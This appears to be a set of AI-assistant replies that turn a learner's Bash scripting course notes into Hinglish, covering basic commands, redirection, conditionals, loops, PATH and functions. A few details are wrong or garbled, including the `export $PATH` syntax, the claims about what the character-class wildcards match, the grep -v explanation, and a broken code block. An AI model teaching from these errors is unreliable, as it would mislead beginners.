@@ -1,0 +1,2016 @@
+Bilkul! Maine aapke saare images se text ko page number ke hisaab se extract karke Hinglish mein convert kar diya hai. Yeh rahe aapke Linux Bash Shell Scripting ke notes:
+
+---
+
+### **Page 1 of 316**
+
+* **Topic: Bash Shell Scripting**
+* Yeh notes Udemy ke course "Bash Shell scripting from zero to automation" se liye gaye hain.
+
+---
+
+### **Page 2 of 316**
+
+* **Lesson 1, 2, 3**
+    1.  **`cd`**: Directory ya folder change karne ke liye command.
+    2.  **`cd ..`**: Ek folder peeche jaane ke liye.
+    3.  **`pwd`**: (Present Working Directory) Yeh command batata hai ki aap abhi kis folder mein hain.
+    4.  **`cd -`**: Yeh aapko uss pichle folder mein wapas le jaata hai jahan aap isse pehle the.
+    5.  **`ls`**: (List) Current folder ke saare files aur folders ke naam list karta hai.
+    6.  **`ls -a`**: Saari hidden files (jo '.' se shuru hoti hain) ko bhi dikhata hai.
+    7.  **`clear` ya `Ctrl + L`**: Terminal ki screen ko saaf karne ke liye.
+    8.  **`ls <folder ka naam>`**: Kisi specific folder ke andar ke saare files aur folders ko list karne ke liye.
+
+* **Lesson 4, 5, 6**
+    9.  **`cp <source file ka path> <destination path>`**: Kisi file ko ek jagah se doosri jagah copy karne ke liye.
+    * **`find <path> -name "<file ka naam>"`**: Kisi file ya folder ko uske naam se dhoondhne ke liye.
+        * **Jaise:** `find /root -name satyam` -> `/root` folder ke andar "satyam" naam ki file ya folder ko dhoondhega.
+
+---
+
+### **Page 3 of 316**
+
+10. **`cp -v`**: `-v` ka matlab hai 'verbose'. Yeh command chalane par terminal aapko output dikhayega, taaki aapko pata chale ki command sahi se kaam kar raha hai. Agar koi error hoga, toh woh bhi terminal par dikh jayega.
+    * **Jaise:** `cp -v <file ka path> <copy karne ka path>`
+11. **Ek saath multiple files copy karna:**
+    * **Command:** `cp -v <file1> <file2> ... <destination path>`
+    * **Matlab:** Ek se zyada files ko ek hi baar mein destination folder mein copy karne ka tareeka.
+12. **`cp -r <folder1> <folder2>`**: `-r` option ka matlab hai 'recursively'. Yeh `folder1` ko uske andar ki saari files aur sub-folders ke saath `folder2` mein copy kar dega.
+* **`file <file ka naam>`**: Yeh pata karne ke liye ki file kis type ki hai (jaise ki executable, rar, gif, text file, etc.).
+    * **Jaise:** `file screenshot.gif` batayega ki yeh ek GIF file hai.
+
+---
+
+### **Page 4 of 316**
+
+* **Lesson 7, 8**
+    13. **`rm <file ka path ya naam>`**: Files ko remove (delete) karne ke liye.
+    14. **`rm -r <folder ka path ya naam>`**: Folder ko uske andar ki saari cheezon ke saath hamesha ke liye remove (delete) karne ke liye. `-r` ka matlab 'recursively' hai.
+    15. **`mv <source path> <destination path>`**: Files ya folders ko ek jagah se doosri jagah move karne ke liye. Iska istemaal file/folder ko rename karne ke liye bhi hota hai. Folder move karne ke liye `-r` option ki zaroorat nahi padti.
+    16. **`cat <text file ka path ya naam>`**: Text file ke content ko terminal par padhne (read) ke liye.
+    17. **`cat -n`**: File ke content ko line numbers ke saath dekhne ke liye.
+* **Helpful Tip:** Kisi bhi command ke baare mein jaanne ke liye, aap `command_name --help` type kar sakte hain. Jaise: `cat --help`. Yeh uss command ke saare parameters aur unka use batayega.
+
+---
+
+### **Page 5 of 316**
+
+18. **Ek saath multiple files ka content dekhna:**
+    * **Command:** `cat <file1.txt> <file2.txt>`
+    * **Matlab:** Yeh command pehle `file1.txt` ka content dikhayega aur uske theek neeche `file2.txt` ka content dikhayega. Isse files 'concatenate' yaani jud jaati hain.
+19. **`more <text file ka path ya naam>`**: Lambi text files ko ek-ek screen (window) karke padhne ke liye. Aap Arrow keys se neeche scroll kar sakte hain.
+* **Lesson 9**
+    20. **`echo "Aapka text yahan"`**: Terminal par koi bhi text show ya print karne ke liye.
+    21. **`echo -e "Hii\nHow are you?"`**: `-e` option special characters ko enable karta hai.
+        * `\n` ka matlab hai 'new line' (agli line).
+        * `\t` ka matlab hai 'tab space'.
+* **Terminal Shortcuts:**
+    * **`Ctrl + Shift + C`**: Terminal se text copy karne ke liye. *(Note: Aapke notes mein `Ctrl+C` likha hai, lekin `Ctrl+C` command ko rokne ke liye hota hai.)*
+    * **`Shift + Ctrl + V`**: Terminal mein text paste karne ke liye.
+
+---
+
+### **Page 6 of 316**
+
+* **Lesson 10: Create Directories And Folders**
+    22. **`touch <file1.txt> <file2.txt>`**: Nayi khali (empty) files banane ke liye. Aap beech mein space dekar ek saath multiple files bhi bana sakte hain.
+    23. **`mkdir <folder1> <folder2>`**: Naye folders (directories) banane ke liye. Aap space dekar ek saath multiple folders bhi bana sakte hain.
+    24. **`mkdir -p <parent_folder/child_folder>`**: Yeh command ek saath parent aur child folder banata hai. Agar `parent_folder` nahi bana hai, toh yeh pehle use banayega aur fir uske andar `child_folder` banayega.
+
+---
+
+### **Page 7 of 316**
+
+* **Lesson 11: Wildcards**
+* Wildcards special characters hote hain jo string (text) ko aasani se dhoondhne ya select karne mein madad karte hain.
+    26. **`*` (Star sign)**: Iska matlab hota hai 'kuch bhi' ya 'kitne bhi characters'.
+        * **Jaise:** `ls *.txt` -> Woh saari files dikhayega jinka naam `.txt` par khatam hota hai, shuru mein kuch bhi ho.
+        * **Jaise:** `ls d*` -> Woh sab kuch dikhayega jiska naam 'd' se shuru hota hai.
+    27. **`?` (Question Mark)**: Iska matlab hota hai 'koi bhi ek single character'.
+        * **Jaise:** `ls ??.txt` -> Sirf woh `.txt` files dikhayega jinke naam mein aage sirf do characters honge (jaise `ab.txt`, `12.txt`).
+
+---
+
+### **Page 9 of 316** (Page 8 is missing)
+
+28. **`[ ]` (Brackets)**: Range ya specific characters ko match karne ke liye.
+    * **`ls [abc]*`**: Woh saari files dikhayega jinka naam 'a', 'b', ya 'c' se shuru hota hai. Jaise: `ab.txt`, `bcb.txt`.
+29. **`!` (Exclamation Mark)**: Iska istemaal brackets `[ ]` ke andar characters ko exclude (chhodne) ke liye hota hai.
+    * **`ls [!abc]*`**: Yeh woh saari files dikhayega jinka naam 'a', 'b', ya 'c' se shuru **nahi** hota hai. Jaise: `123.txt`, `t.txt`.
+* **`reset`**: Yeh terminal command hai jo saare purane commands ko clear karke terminal ko restart jaisa kar deta hai.
+
+---
+
+### **Page 10 of 316**
+
+* **Character Classes**
+    30. **`[[:alpha:]]`**: Sirf alphabetic characters (A-Z, a-z) ko match karta hai.
+        * **Jaise:** `ls [[:alpha:]]*.txt` -> Sirf woh `.txt` files dikhayega jinke naam mein sirf letters hain.
+    31. **`[[:digit:]]`**: Sirf numbers (0-9) ko match karta hai.
+        * **Jaise:** `ls [[:digit:]]*.txt` -> Sirf woh `.txt` files dikhayega jinke naam mein sirf numbers hain.
+    32. **`[[:lower:]]`**: Sirf chote akshar (lowercase letters) ko match karta hai.
+        * **Jaise:** `ls [[:lower:]]*.txt` -> Sirf woh `.txt` files dikhayega jinke naam mein sirf lowercase letters hain.
+
+---
+
+### **Page 11 of 316**
+
+* **Lesson 12: Variables**
+* Variables data store karne ke liye container jaise hote hain.
+    32. **Variable Banana aur Access Karna**:
+        * `bob=130` (Variable `bob` banaya)
+        * Variable ko access karne ke liye `$` (dollar symbol) ka use hota hai: `echo $bob`.
+        * Variable access karne ka behtar tareeka hai: `echo ${bob}`.
+    33. **`unset <variable ka naam>`**: Kisi variable ko delete ya unset karne ke liye.
+        * **Jaise:** `unset bob`
+    34. **Variable Manipulation (String Slicing)**:
+        * Maan lijiye, `a=123456789`
+        * i) **Length Pata Karna:** `echo ${#a}`
+            * Output: `9`
+        * ii) **String ka ek hissa nikalna:** `echo ${a:4}`
+            * Yeh 4th index (jo ki 5th character hai) se aakhiri tak sab kuch print karega. Output: `56789`
+        * iii) **Specific length ka hissa nikalna:** `echo ${a:4:3}`
+            * Yeh 4th index se shuru karke aage ke 3 characters print karega. Output: `567`
+        * iv) **Aakhiri se nikalna:** `echo ${a: -3}`
+            * Yeh aakhiri 3 characters print karega. (Note: `-` aur `3` ke beech space zaroori hai). Output: `789`
+
+---
+
+Umeed hai yeh notes aapke liye aasaan aur Gजबर्दस्त honge! Agar koi aur sawaal ho, toh poochh lena!
+
+=============================================================
+
+Bilkul, maine aapke naye images se bhi saara text extract kar liya hai aur usse page number ke hisaab se Hinglish mein convert kar diya hai. Yeh rahe aapke aage ke notes:
+
+-----
+
+### **Page 11 of 316 (Continuation of Lesson 12)**
+
+  * **Lesson 13: Variable Manipulation (Advanced)**
+
+      * Yeh variable ke text ko modify karne ke advanced tareeke hain. Maan lijiye hamare paas do variables hain:
+          * `b="hello there"`
+          * `a="123456789"`
+
+    <!-- end list -->
+
+    35. **Text ko Shuru (Start) se Remove Karna:**
+
+          * i) **`echo ${b#h}`**
+              * **Matlab:** Variable `b` ki value mein se shuru se 'h' ko remove kar dega.
+              * **Output:** `ello there`
+          * ii) **`echo ${b##h}`**
+              * **Matlab:** Yeh bhi shuru se remove karta hai, lekin sabse lambe matching pattern ko. Simple cases mein iska result `#` jaisa hi hota hai.
+          * iii) **`echo ${b#*t}`**
+              * **Matlab:** Shuru se lekar pehle 't' tak sab kuch remove kar dega. `*t` ka matlab hai 'kuch bhi character jab tak t na mil jaaye'.
+              * **Output:** `here`
+
+    36. **Text ko Aakhir (End) se Remove Karna:**
+
+          * v) **`echo ${a%9}`**
+              * **Matlab:** Variable `a` ki value mein se aakhir se '9' ko remove kar dega.
+              * **Output:** `12345678`
+          * vi) **`echo ${a%789}`**
+              * **Matlab:** Variable `a` ki value mein se aakhir se '789' ko remove kar dega.
+              * **Output:** `123456`
+
+-----
+
+### **Page 13 of 316**
+
+  * **Lesson 15**
+    36\. **`read` command**
+    \* **Matlab:** Yeh command user se input lene ke kaam aata hai.
+    \* i) **`read a`**
+    \* Terminal aapse input maangega. Aap jo bhi likh kar Enter dabayenge, woh 'a' variable mein save ho jayega.
+    \* Aap `echo $a` karke uss value ko dekh sakte hain.
+    \* ii) **`read -p "Give me the value of variable" q`**
+    \* `-p` option ka matlab hai 'prompt'. Yeh user ko input dene se pehle ek message dikhayega.
+    \* Yahan, screen par "Give me the value of variable" likha aayega aur user jo bhi value dega, woh 'q' variable mein store ho jayegi.
+
+-----
+
+### **Page 14 of 316**
+
+  * **Lesson 16: Redirection**
+
+      * **Matlab:** Redirection ka matlab hai kisi command ke output ko screen par dikhane ke bajaye kisi file mein save karna.
+          * Har command ke 2 output hote hain:
+        <!-- end list -->
+        1.  **Standard Output (stdout):** Normal result/output.
+        2.  **Standard Error (stderr):** Agar command mein koi galti ho toh error message.
+      * By default, yeh dono screen (terminal) par jaate hain.
+
+    <!-- end list -->
+
+    37. **Output ko Redirect karna (`>`)**
+          * **`ls -l > sat.txt`**
+              * **Matlab:** `ls -l` command ka jo bhi output aayega, woh screen par nahi dikhega. Uski jagah, woh `sat.txt` file mein save ho jayega.
+              * **Important:** Agar `sat.txt` file pehle se मौजूद hai, toh uska purana data delete ho jayega aur naya data aa jayega. Agar file nahi hai, toh nayi ban jayegi.
+          * **Example:**
+              * `echo "hii" > Man.txt` (File mein "hii" save ho gaya)
+              * `echo "everybody" > Man.txt` (Ab file mein sirf "everybody" bachega, "hii" delete ho jayega)
+          * **Note:** Agar aap chahte hain ki purana data delete na ho, toh aapko `>>` (append) ka use karna hoga.
+
+-----
+
+### **Page 15 of 316**
+
+38. **Append Redirection (`>>`)**
+
+      * **Matlab:** Yeh bhi output ko file mein bhejta hai, lekin file ke purane content ko delete nahi karta. Naya content aakhir mein jod (append) deta hai.
+      * **Jaise:**
+          * i) `echo "hii" > hii.txt`
+          * ii) `echo "Everybody" >> hii.txt`
+          * Ab agar aap `hii.txt` file kholenge, toh usmein likha hoga:
+            ```
+            hii
+            Everybody
+            ```
+
+39. **`cat bob.txt com.txt > sat.txt`**
+
+      * **Matlab:** Yeh command `bob.txt` aur `com.txt` dono ke content ko jod kar `sat.txt` naam ki ek file mein daal dega.
+
+40. **`cat > Man.txt`**
+
+      * **Matlab:** Is command ko chalane ke baad, aap terminal mein jo kuch bhi type karke Enter dabayenge, woh sab `Man.txt` file mein save hota jayega. Input band karne ke liye `Ctrl+D` dabayein. Agar aap `>>` use karenge (`cat >> Man.txt`), toh aapka type kiya hua text file mein neeche judta jayega.
+
+-----
+
+### **Page 16 of 316**
+
+  * **Lesson 17**
+    41\. **Error ko Redirect karna (`2>`)**
+    \* **Matlab:** Sirf error messages (Standard Error) ko file mein bhejne ke liye `2>` ka use hota hai. `2` yahan 'Standard Error' ka file descriptor hai.
+    \* **Jaise:** `ls -l (wrong_command) 2> bfile.txt`
+    \* Yahan `wrong_command` ki wajah se jo error aayega, woh screen par na dikhkar `bfile.txt` mein save ho jayega.
+
+      * **Sirf Output Redirect Karna:**
+
+          * `ls -l text1.txt (wrong_command) > sam.txt`
+          * Isme `ls -l text1.txt` ka sahi output `sam.txt` mein jayega, lekin `wrong_command` ka error screen par hi dikhega.
+
+      * **Sirf Error Redirect Karna:**
+
+          * `ls -l text1.txt (wrong_command) 2> sam.txt`
+          * Isme `wrong_command` ka error `sam.txt` mein jayega aur `ls -l text1.txt` ka sahi output screen par hi dikhega.
+
+-----
+
+### **Page 17 of 316**
+
+42. **Output aur Error dono ko ek hi file mein Redirect karna**
+
+      * **Matlab:** Agar aap chahte hain ki command ka normal output aur error message dono ek hi file mein save ho, toh `&>` ka use karein.
+      * **Jaise:** `ls -l text1.txt (wrong_command) &> sam.txt`
+          * Ab `sam.txt` file mein sahi output aur error message, dono aa jayenge.
+
+43. **Output aur Error ko alag-alag files mein Redirect karna**
+
+      * **Matlab:** Aap output aur error ko alag-alag files mein bhi bhej sakte hain.
+      * **Jaise:** `ls -l text1.txt (wrong_command) > output.txt 2> error.txt`
+          * Isse sahi output `output.txt` mein jayega aur error `error.txt` mein.
+
+44. **`/dev/null` ka use**
+
+      * **Matlab:** Linux mein `/dev/null` ek special file hai. Yeh "black hole" ki tarah hai. Aap isme jo bhi bhejenge, woh hamesha ke liye gayab ho jayega.
+      * **Use:** Jab aap nahi chahte ki koi error ya output screen par dikhe, toh use `/dev/null` mein bhej do.
+      * **Jaise:** `command 2> /dev/null` (Yeh command ke sirf error ko gayab kar dega).
+
+-----
+
+### **Page 18 of 316**
+
+  * **Lesson 18: Pipe Command (`|`)**
+    45\. **Pipe (`|`)**
+    \* **Matlab:** Pipe ka symbol `|` (vertical bar) hota hai. Iska kaam ek command ke output ko doosre command ka input banana hota hai.
+    \* **Jaise:** `ls desktop | less`
+    \* Yahan `ls desktop` command ka jo bhi output (files ki list) aayega, woh screen par nahi dikhega.
+    \* Woh output `pipe` ke zariye `less` command ko as an input mil jayega. `less` command uss list ko page-by-page dekhne mein madad karega.
+    \* Aap ek saath kitne bhi pipes use kar सकते hain.
+
+-----
+
+### **Page 19 of 316**
+
+  * **Lesson 19: Grep Command**
+    46\. **`grep`**
+    \* **Matlab:** `grep` ka matlab 'Global Regular Expression Print' hai. Yeh command kisi file ke andar ya kisi command ke output mein se specific text/word dhoondhne ke kaam aata hai.
+    \* **Jaise:** `grep "word_you_are_looking_for" path/to/the/file`
+
+    47. **Example:** `grep So b.txt`
+          * Yeh `b.txt` file ke andar har uss line ko dhoondhega aur print karega jismein "So" likha hai.
+
+    <!-- end list -->
+
+      * **Case-Sensitivity:** `grep` by default case-sensitive hota hai. Matlab 'So' aur 'so' ko alag-alag maanta hai.
+
+      * **`grep -i` (Case-Insensitive):**
+
+          * Agar aap chahte hain ki search case-sensitive na ho, toh `-i` argument ka use karein.
+          * **Jaise:** `grep -i so b.txt` yeh 'so', 'So', 'SO' sabko dhoondh lega.
+
+      * **`grep -v` (Invert Match):**
+
+          * Yeh `-v` argument unn sabhi lines ko print karta hai jinmein aapka search kiya hua word **nahi** hai.
+          * **Jaise:** `ls | grep -v t`
+              * Yeh `ls` ke output mein se woh saare file/folder ke naam hatakar baaki sab dikhayega jinke naam mein 't' aata hai.
+
+-----
+
+### **Page 20 of 316**
+
+  * **Lesson 21: File Permissions**
+
+      * Linux mein har file ke paas 3 tarah ki permissions hoti hain:
+          * i) **Readable (`r`):** File ko padh sakte hain.
+          * ii) **Writable (`w`):** File mein changes kar sakte hain.
+          * iii) **Executable (`x`):** Agar file ek script ya program hai, toh use run kar sakte hain.
+
+  * **Lesson 22**
+    47\. **Permission Dena (`chmod`)**
+    \* **`chmod +x file_name`**
+    \* **Matlab:** Yeh command file ko 'execute' permission deta hai. `+` ka matlab hai permission add karna.
+    \* **Permission Wapas Lena:**
+    \* **`chmod -x file_name`**
+    \* **Matlab:** Yeh command file se 'execute' permission hata deta hai. `-` ka matlab hai permission remove karna.
+    \* **Note:** `x` ki jagah aap `r` (read) ya `w` (write) bhi use kar sakte hain. Jaise: `chmod +rwx file_name`.
+
+  * **Note:** `gedit` Linux ka ek graphical text editor hai jo aksar pehle se install aata hai.
+
+-----
+
+### **Page 21 of 316**
+
+  * **Section 2: Bash Shell Basics**
+
+  * **Lesson 24: Our first shell script**
+
+      * i) **Shebang (`#!/bin/bash`)**: Har bash script file hamesha iss line se shuru honi chahiye. Yeh system ko batata hai ki script ko run karne ke liye bash interpreter ka use karna hai.
+      * ii) **Script ko Run Karna**: Script run karne ke liye `bash file_name` command ka istemaal karein.
+      * iii) **File Extension**: Bash script files ka extension `.sh` hota hai. Jaise: `satish.sh`.
+      * **Example:** `bash satish.sh` command `satish.sh` file ko run kar dega.
+
+  * **Kuch Zaroori Linux Commands:**
+
+    1.  **`grep`**: Ek pattern se match hone wali lines ko print karta hai.
+    2.  **`sort`**: Badi text files ki lines ko sort karta hai.
+    3.  **`uniq`**: Repeat ho rahi lines ko report ya ignore karta hai.
+    4.  **`tr`**: Characters ko badalne (translate) ya delete karne ke kaam aata hai.
+    5.  **`base64`**: Data ko encode/decode karke standard output par print karta hai.
+    6.  **`tar`**: Files ka archive (bundle) banane ke liye.
+    7.  **`gzip`**: Files ko compress ya expand karne ke liye.
+
+-----
+
+Aapke notes bahut acche se aage badh rahe hain\! Koi bhi doubt ho toh poochhne mein jhijhakna mat.
+
+=============================================================
+
+Bilkul, maine aapke diye gaye saare naye images se bhi text extract kar liya hai aur usse page number ke hisaab se Hinglish mein convert kar diya hai. Yeh rahe aapke aage ke notes:
+
+-----
+
+### **Page 22 of 316**
+
+  * **Lesson 25: String par `if` condition lagana**
+      * **Syntax:**
+
+        ```bash
+        d="hello"
+        if [ "$d" == "hello" ]; then
+            echo "hello it is condition"
+        fi
+        ```
+
+          * **Important:** `[` aur `]` ke baad aur pehle space dena zaroori hai, varna yeh command ki tarah kaam nahi karega.
+          * `fi` ka matlab hai ki `if` statement yahan khatam ho gaya.
+
+      * **`if` ke saath `else` ka use:**
+
+        ```bash
+        read -p "say something" d
+        if [ "$d" == "hello" ]; then
+            echo "hello to you"
+        else
+            echo "No hello"
+        fi
+        ```
+
+-----
+
+### **Page 23 of 316**
+
+  * **`if` string mein `elif` (else if) ka use:**
+      * Iska use multiple conditions check karne ke liye hota hai.
+        ```bash
+        ```
+    if [ "$d" == "hello" ]; then
+    echo "hello to you"
+    elif [ "$d" == "bye" ]; then
+    echo "bye to you"
+    else
+    echo "have a nice day"
+    fi
+    ```
+    
+    ```
+  * **String khaali (Empty) hai ya nahi, yeh check karna:**
+      * **`-z`**: Yeh check karta hai ki string khaali (empty) hai ya nahi.
+        ```bash
+        if [ -z "$d" ]; then
+            echo "Empty String"
+        fi
+        ```
+      * **`-n`**: Yeh check karta hai ki string khaali **nahi** hai (non-empty).
+      * **`!=`**: Iska matlab hota hai "barabar nahi hai" (not equal).
+
+-----
+
+### **Page 24 of 316**
+
+  * **Lesson 26: Numbers aur Files par `if` condition**
+      * **Numbers ke liye Conditions (Operators):**
+
+          * `-eq` : barabar hai (equal to)
+          * `-ne` : barabar nahi hai (not equal to)
+          * `-lt` : chota hai (lower than)
+          * `-gt` : bada hai (greater than)
+          * `-le` : chota ya barabar hai (lower or equal)
+          * `-ge` : bada ya barabar hai (greater or equal)
+          * **Jaise:** `if [ $numb -eq 10 ]; then echo "hii"; fi`
+
+      * **Files ke liye Conditions:**
+
+          * `-e` : File maujood hai (exists).
+          * `-d` : Yeh ek directory (folder) hai.
+          * `-f` : Yeh ek regular file hai.
+          * `-s` : File khaali nahi hai (not empty).
+          * `-r` : File ko padha ja sakta hai (readable).
+
+-----
+
+### **Page 25 of 316**
+
+  * **File Conditions (Continuation):**
+
+      * `-w` : File mein likha ja sakta hai (writable).
+      * `-x` : File ko run kiya ja sakta hai (executable).
+      * **`!` (NOT Operator):** Kisi bhi condition se pehle `!` lagane ka matlab hai 'NOT', yaani condition ka ulta (reverse).
+
+  * **Lesson 27: Logic Conditions (Ek se zyada conditions ek saath)**
+
+      * **`-a` (AND):** Dono conditions sach (true) honi chahiye. (Yeh purana tareeka hai).
+
+          * **Jaise:** `if [ $numb -gt 3 -a $numb -lt 10 ]; then echo "Number 3 se 10 ke beech hai"; fi`
+
+      * **`-o` (OR):** Dono mein se koi bhi ek condition sach (true) honi chahiye. (Yeh purana tareeka hai).
+
+      * **Naya Tareeka:**
+
+          * **`&&` (AND):** Yeh `-a` ki jagah use hota hai.
+          * **`||` (OR):** Yeh `-o` ki jagah use hota hai.
+
+-----
+
+### **Page 26 of 316**
+
+  * **Lesson 28: `for` loop**
+
+      * **Matlab:** Kisi kaam ko baar-baar repeat karne ke liye.
+          * **Syntax:**
+        <!-- end list -->
+        ```bash
+        for i in {1,2,3,4}; do
+            echo "Hii there, value of i is $i"
+        done
+        ```
+          * Yeh `echo` statement ko 4 baar chalayega, har baar `$i` ki value badal kar.
+      * **`break` statement:** Loop ko beech mein hi rokne ya todne ke liye `break` ka use kar sakte hain.
+
+  * **Lesson 29: Back Script [Intro]**
+
+      * Agar aapko kai folders peeche jaana hai, jaise `cd ../../../..`, toh iska ek aasan tareeka ho sakta hai.
+      * Ek custom command (script/alias) banaya ja sakta hai jaise `back 4`, jo aapko 4 folder peeche le jayega.
+
+-----
+
+### **Page 27 of 316**
+
+  * **Lesson 30: Subshells**
+      * **Matlab:** Jab aap apne terminal ke andar ek aur terminal kholte hain. Terminal mein `bash` command type karne se aap ek naye shell (subshell) mein chale jaate hain.
+          * **Fayda:** Subshell mein banaya gaya variable sirf ussi subshell ke andar use ho sakta hai, bahar wale (parent) shell mein nahi. Isse variables mix nahi hote.
+      * **`exit` command:** Subshell se bahar aakar vapas parent shell mein jaane ke liye `exit` command ka use karein.
+
+-----
+
+### **Page 28 of 316**
+
+  * **Lesson 31: The `source` Command**
+
+      * Script run karne ke do tareeke hain: `bash script.sh` aur `source script.sh`.
+      * Jab aap `bash script.sh` se run karte hain, toh script ek subshell mein chalti hai aur uske variables script khatam hote hi gayab ho jaate hain.
+      * Lekin jab aap `source script.sh` (ya `. script.sh`) se run karte hain, toh script current shell mein chalti hai. Isse script ke andar banaye gaye variables script khatam hone ke baad bhi ussi terminal mein available rehte hain.
+
+  * **Lesson 32: The `type` Command**
+
+      * **Matlab:** Yeh command batata hai ki koi doosra command asal mein kya hai (kya woh ek alias hai, ya ek built-in command hai, ya system mein rakhi koi file hai).
+      * **Jaise:** `type cat` -\> Output aayega `cat is /bin/cat` (matlab cat ek program file hai).
+      * **Jaise:** `type ll` -\> Output aayega `ll is aliased to 'ls -l'` (matlab ll ek shortcut/alias hai).
+
+-----
+
+### **Page 29 of 316**
+
+  * **Lesson 33: Alias in Bash**
+      * **Matlab:** Alias lambe commands ke liye hamare dwara banaya gaya ek chota, custom shortcut hota hai.
+      * **Syntax:** `alias shortcut_ka_naam='asli_command'` (beech mein space nahi hona chahiye).
+      * **Jaise:** `alias ll='ls -l'`. Ab har baar `ls -l` likhne ke bajaye aap sirf `ll` likh sakte hain.
+      * Aap ek alias mein semicolon (`;`) se alag karke ek se zyada command bhi daal sakte hain.
+      * **Jaise:** `alias cpl='clear; pwd; ls -l'`
+
+-----
+
+### **Page 30 of 316**
+
+  * **Lesson 34: Command Substitution**
+
+      * **Matlab:** Iski madad se hum kisi command ke output ko ek variable mein store kar sakte hain, taaki use baad mein istemaal kar sakein.
+          * **Syntax:** `variable_name=$(command)`
+      * **Jaise:** `current_folder=$(pwd)`. Isse `pwd` command ka output (jo ki current directory ka path hai) `current_folder` naam ke variable mein save ho jayega.
+
+  * **Lesson 35: Parameters in Bash (Positional Parameters)**
+
+      * **Matlab:** Yeh script ko run karte waqt usko di gayi values (arguments) hoti hain.
+          * Script ke andar, in values ko `$1` (pehla parameter), `$2` (doosra parameter), `$3`, etc. se access kiya jaata hai.
+      * **Jaise:** Ek file `sat.sh` banayein jismein likha ho `echo "Hii, how are you $1"`.
+      * Ab isko `bash sat.sh Satish` se run karne par `Satish` ki value `$1` ki jagah le legi.
+      * **Output:** `Hii, how are you Satish`
+
+-----
+
+### **Page 31 of 316**
+
+  * Aap seedhe `$1` se lekar `$9` tak parameters use kar sakte hain. 9 ke baad (10th, 11th, etc.) ke parameters ke liye aapko curly braces `{}` use karne padenge, jaise `${10}`, `${11}`. Aisa isliye kyunki bina braces ke, shell `$10` ko `$1` aur `0` samjhega.
+
+  * **Lesson 36: Brace Expansion**
+
+      * **Matlab:** Yeh ek hi baar mein ek pattern se multiple strings (jaise files ya folders ke naam) banane ka ek zabardast shortcut tareeka hai.
+      * **Jaise 1:** `echo file{1,2,3}.txt` -\> **Output:** `file1.txt file2.txt file3.txt`
+      * **Jaise 2:** `mkdir folder{A,B,C}` -\> Yeh `folderA`, `folderB`, aur `folderC` naam ke teen folder bana dega.
+      * **Jaise 3:** `echo {a,b,c}-{1,2,3}` -\> **Output:** `a-1 a-2 a-3 b-1 b-2 b-3 c-1 c-2 c-3` (saare possible combinations).
+
+-----
+
+Aapke notes bahut hi systematic hain\! Agar aur koi pages hain, toh zaroor bhejna.
+
+=============================================================
+
+Haan bilkul\! Maine aapke in sabhi naye pages se bhi text extract kar liya hai aur usse page-wise, step-by-step Hinglish mein convert kar diya hai. Yeh rahe aapke aage ke notes:
+
+-----
+
+### **Page 32 of 316**
+
+  * **Lesson 38: Script ko Environment Path mein Add karna**
+      * **Matlab:** Agar hum chahte hain ki hamari script ya program ko hum terminal mein kahin se bhi sirf uska naam likh kar chala sakein (jaise `ls` ya `cd` command), toh humein uske folder ka path (location) `$PATH` environment variable mein add karna padta hai.
+
+      * **`whereis <command>`**
+
+          * **Matlab:** Yeh command batata hai ki koi program (jaise `python3`) system mein kahan par install hai.
+          * **Jaise:** `whereis python3` -\> **Output:** `/root/Desktop/python3` (Yeh batayega ki python3 iss location par hai).
+
+      * **`echo $PATH`**
+
+          * **Matlab:** Yeh command un sabhi folders ke paths ki list dikhata hai jahan shell (terminal) commands ko dhoondhta hai.
+          * Yeh saare paths semicolon (`;`) se alag-alag hote hain. Jab aap `ls` jaisa koi command type karte hain, toh system इन्हीं paths mein uss command ko dhoondhta hai.
+
+      * Maan lijiye main Android Studio ko terminal se `android-studio.sh` command dekar kahin se bhi chalana chahta hoon. Uske liye mujhe Android Studio ke `bin` folder ka path `$PATH` mein add karna hoga.
+
+          * Android Studio ka path hai: `/usr/local/android-studio/bin/android-studio.sh`
+
+-----
+
+### **Page 33 of 316**
+
+  * **`$PATH` mein naya path add karne ka tareeka:**
+      * ii) **Command:** `PATH=/usr/local/android-studio/bin:$PATH`
+
+          * **Matlab:** Yeh command naye path ko purane `$PATH` ke aage jod deta hai. `:` yahan par separator ka kaam kar raha hai (Note: notes mein semicolon likha hai, lekin Linux mein colon `:` use hota hai).
+          * `:$PATH` likhne se purane saare paths bhi bane rehte hain. Agar aap yeh nahi likhenge toh purane saare paths delete ho jayenge.
+
+      * iii) **`export $PATH`**
+
+          * **Matlab:** `PATH` variable mein kiye gaye badlav ko current terminal session aur uske child processes ke liye permanent (update) karne ke liye `export` command ka istemaal hota hai.
+          * Ab, aap terminal mein kahin se bhi `android-studio.sh` likhenge, toh Android Studio open ho jayega.
+
+-----
+
+### **Page 34 of 316**
+
+  * **Lesson 40: Functions**
+      * **Matlab:** Function code ka ek block hota hai jise hum ek naam de dete hain aur phir usse baar-baar use kar sakte hain. Isse code ko organize karna aasan ho jaata hai.
+
+      * **Syntax:**
+
+        ```bash
+        function_name () {
+            # Code jo aap chahte hain
+        }
+        ```
+
+      * **Function ko Call karna (Use karna):**
+
+          * Sirf function ka naam likhein: `function_name`
+
+      * **Example (Arguments ke saath):**
+
+        ```bash
+        hello2 () {
+            echo "hello $1"
+            echo "hello $2"
+        }
+        ```
+
+          * **Function ko Call karna:** `hello2 "Satyam" "Shivam"`
+          * **Output:**
+            ```
+            hello Satyam
+            hello Shivam
+            ```
+          * **Note:** Function ko call karte waqt arguments dete samay brackets `()` ki zaroorat nahi hoti.
+
+-----
+
+### **Page 35 of 316**
+
+  * **Lesson 41: Variable Scope in Functions**
+      * **Scope ka matlab:** Ek variable kahan tak available ya accessible hai.
+
+          * **Global Variable:** By default, function ke andar banaya gaya variable 'global' hota hai. Iska matlab, use function ke bahar se bhi access kiya ja sakta hai.
+
+      * **Local Variable:** Agar aap chahte hain ki variable sirf function ke andar hi use ho sake aur bahar se access na ho, toh use `local` keyword ke saath banayein.
+
+      * **Example:**
+
+        ```bash
+        myfunction () {
+            local var1="Mr. Eggs"
+            var2="Salad"
+        }
+
+        myfunction  # Function ko call kiya
+
+        echo "$var1 : $var2"
+        ```
+
+          * **Output:** `: Salad`
+          * **Explanation:** `var1` ka output khaali (empty) aaya kyunki woh ek `local` variable tha aur function ke bahar accessible nahi hai. `var2` ek global variable tha, isliye woh print ho gaya.
+
+-----
+
+### **Page 36 of 316**
+
+  * **Lesson 63: Arrays**
+      * **Matlab:** Array ek special type ka variable hota hai jo ek hi naam se multiple values (ek se zyada value) store kar sakta hai.
+
+      * **Array Banana (Define karna):**
+
+          * `a[0]="ice"`
